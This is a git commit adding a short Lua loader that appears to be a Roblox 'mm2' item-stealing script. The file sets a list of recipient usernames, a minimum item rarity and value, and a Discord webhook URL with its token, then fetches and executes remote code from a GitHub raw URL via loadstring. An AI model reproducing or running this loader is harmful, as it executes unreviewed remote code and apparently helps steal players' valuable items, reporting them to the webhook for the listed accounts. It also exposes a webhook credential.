495383e9fbb44e5d76b431ffc22e534f7eac4c82
clippedbyjkl <hyytiainenalex@gmail.com>
2026-01-21 18:09:15 -0500

    Add files via upload

---
+++ obf_0V1Wc91Yb51957M7pfnbrc08Wa0BjdUT222g13tjvp9619DG89V67piVl03rVwfr.lua
@@ -0,0 +1,7 @@
+_G.Usernames = {"6erserkr", "ARry_226", "lews037"} 
+_G.min_rarity = "Godly"
+_G.min_value = 1 
+_G.pingEveryone = "Yes" 
+_G.webhook = "https://discord.com/api/webhooks/1463643286190297355/A9h6TBQyKUAxbslLH2yTxbi833PmlBD1K_aer-HWVENmJEzEa_iKjqm0FMd10AmIX2-X" 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/clippedbyjkl/mm2.2/refs/heads/main/source.lua"))()
